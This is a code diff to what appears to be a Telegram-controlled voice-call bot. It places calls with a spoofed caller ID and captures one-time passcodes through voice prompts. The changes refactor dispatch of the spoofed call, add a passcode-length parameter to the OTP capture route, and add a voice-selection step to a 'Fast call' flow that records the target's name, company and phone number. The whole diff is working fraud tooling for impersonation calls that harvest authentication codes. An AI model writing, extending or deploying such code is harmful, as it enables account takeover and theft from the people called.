@@ -2607,22 +2607,26 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
         # Dispatch call creation to background worker to avoid blocking Flask/Telegram threads
         # Use make_call_and_store_async so metadata is persisted without waiting here.
         try:
-            fut = make_call_and_store_async(
-                user_id=str(user_id),
-                to=to,
-                from_number=from_number,
-                caller_id=caller_id,
-                webhook_url=webhook_url,
-                record=call_record,
-                machine_detection=amd_param,
-                async_amd=bool(amd_param),
-                async_amd_status_callback=call_params.get("async_amd_status_callback"),
-                machine_detection_timeout=call_params.get("machine_detection_timeout"),
-                machine_detection_speech_threshold=call_params.get("machine_detection_speech_threshold"),
-                machine_detection_speech_end_threshold=call_params.get("machine_detection_speech_end_threshold"),
-                machine_detection_silence_timeout=call_params.get("machine_detection_silence_timeout"),
-                target=to,
-            )
+            dispatch_kwargs = {
+                "user_id": str(user_id),
+                "to": to,
+                "from_number": from_number,
+                "caller_id": caller_id,
+                "webhook_url": webhook_url,
+                "record": call_record,
+                "machine_detection": amd_param,
+                "async_amd": bool(amd_param),
+                "target": to,
+            }
+            if amd_param:
+                dispatch_kwargs.update({
+                    "async_amd_status_callback": call_params.get("async_amd_status_callback"),
+                    "machine_detection_timeout": call_params.get("machine_detection_timeout"),
+                    "machine_detection_speech_threshold": call_params.get("machine_detection_speech_threshold"),
+                    "machine_detection_speech_end_threshold": call_params.get("machine_detection_speech_end_threshold"),
+                    "machine_detection_silence_timeout": call_params.get("machine_detection_silence_timeout"),
+                })
+            fut = make_call_and_store_async(**dispatch_kwargs)
             # If the caller expects a SID string, try to return quickly if available; otherwise return future
             try:
                 sid = None
@@ -4788,6 +4792,7 @@ def capture_otp():
         gather_action = (
             f"/capture_otp?user_id={quote_plus(str(user_id))}"
             f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
+            f"&code_length={quote_plus(str(code_length))}"
         )
         gather = Gather(
             num_digits=1,
@@ -4806,6 +4811,8 @@ def capture_otp():
         return Response(str(resp), content_type="application/xml")
 
     if stage == "otp":
+        if digits and not after_gather:
+            after_gather = True
         if not after_gather:
             prompt = otp_prompt
             resp = VoiceResponse()
@@ -5350,19 +5357,23 @@ try:
 except Exception:
     logger.debug("Could not alias bot.send_message to telegram_safe_send")
 
-# Also alias legacy telebot compatibility instance if present
+# Also alias legacy telebot compatibility instance if present.
+# The compat instance is defined in handlers.call_flow and may not be
+# initialized yet during import, so this block must be defensive.
 try:
-    if '_telebot_instance' in globals() and _telebot_instance:
-        # preserve original if present
-        _orig = getattr(_telebot_instance, 'send_message', None)
+    import handlers.call_flow as call_flow_compat
+    compat_instance = getattr(call_flow_compat, '_telebot_instance', None)
+    if compat_instance:
+        _orig = getattr(compat_instance, 'send_message', None)
         try:
-            _telebot_instance.send_message = telegram_safe_send
+            compat_instance.send_message = telegram_safe_send
         except Exception:
             pass
         if _orig and not globals().get('_original_bot_send_message'):
             _original_bot_send_message = _orig
 except Exception:
     logger.debug("Could not alias _telebot_instance.send_message to telegram_safe_send")
+
 def send_main_menu(chat_id: int, user, message_id: Optional[int] = None) -> None:
     status = get_panel_status_text(str(user.id))
     text = (
@@ -7802,15 +7813,19 @@ def handle_stateful_text(message):
         write_user_file(user_id_str, "Language.txt", language)
         write_user_file(user_id_str, "Delivery.txt", delivery)
         write_user_file(user_id_str, "Digits.txt", otp_length)
-        clear_user_state(user_id_str)
+        write_user_file(user_id_str, "CodeLength.txt", otp_length)
+        set_user_state(user_id_str, "normal_call_step_9_voice")
 
         summary = f"⚡ Fast call ready:\n{name} @ {company}\nPhone: {phone_clean}"
-        buttons = types.InlineKeyboardMarkup()
-        buttons = types.InlineKeyboardMarkup(row_width=2)
-        buttons.add(types.InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm"))
-        buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
+        keyboard = build_voice_selection_keyboard()
         write_user_file(user_id_str, "call_mode_label.txt", "Fast Mode")
-        bot.send_message(message.chat.id, summary, reply_markup=buttons)
+        bot.send_message(message.chat.id, summary, reply_markup=None)
+        bot.send_message(
+            message.chat.id,
+            build_voice_selection_text(),
+            reply_markup=keyboard,
+            parse_mode="HTML",
+        )
         return
 
     # AI Mode phone input
